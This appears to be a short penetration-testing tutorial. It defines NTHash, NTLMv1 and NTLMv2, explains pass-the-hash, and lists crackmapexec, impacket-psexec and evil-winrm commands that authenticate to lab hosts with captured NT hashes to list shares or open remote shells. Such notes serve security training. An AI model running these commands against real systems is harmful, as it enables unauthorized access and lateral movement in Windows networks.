---
legal-banner: true
---

### **INTRODUCTION**

NTLMv1, NTLMv2 and NThash are all confusing terms and used interchangeably but let’s settle this once and for all:

1. NTHash: this is the hash of the password stored in the system in SAM hive and in active directory networks in the NTDS file.
2. NTLMv1: this is a challenge/response protocol to authenticate to a system using the NTHash.
3. NTLMv2: this is the newer version of the NTLM protocol with some adjustments but the same concept.

Now that we’ve settled this, let’s get back to business.

### **PASS-THE-HASH**

PtH or Pass-the-Hash attack is an attack where the attacker passes NTHash to systems instead of passwords. Remember NTLM? We as an end user type our password and let the system send it through a hashing algorithm to become NTHash and then send that to NTLM to authenticate us to the target system. Now in PtH, instead of typing the password and letting the system make a hash out of it for us, we pass the already found NThash, skipping those steps before authentication.

`crackmapexec smb 192.168.154.171 -u 'ted' -d 'exam.com' -H ':31aa99ebd6ea4b6d07051acfd48efa35' --shares`

`impacket-psexec -hashes ":d098fa8675acd7d26ab86eb2581233e5" exam.com/zensvc@192.168.154.170`

`impacket-psexec -hashes ":d098fa8675acd7d26ab86eb2581233e5"zensvc@192.168.154.170`

`evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6`